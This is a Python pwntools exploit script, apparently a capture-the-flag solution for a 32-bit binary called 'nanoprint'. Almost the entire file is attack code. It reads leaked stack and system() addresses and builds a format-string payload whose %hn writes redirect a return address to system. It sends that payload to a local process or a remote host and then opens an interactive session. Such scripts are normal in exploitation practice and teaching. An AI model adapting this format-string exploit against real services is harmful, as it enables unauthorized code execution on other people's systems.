#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './nanoprint'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = local_libc

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
# elf, libc

# rop1
stack = eval(p.recv(10))
system = eval(p.recv(10))
info_addr('stack',stack)
info_addr('system',system)
ret = stack+0x71
info_addr('ret',ret)
payload = '%%%dc%%14$hn'%((system)&0xffff) +'%%%dc%%15$hn'%((((system>>16)-(system))%0x10000)&0xffff)
payload = payload.ljust(29,'B')
payload += p32(ret) + p32(ret+2)
print len(payload)
print payload

debug()
sl(payload)

# log.warning('--------------')

p.interactive()

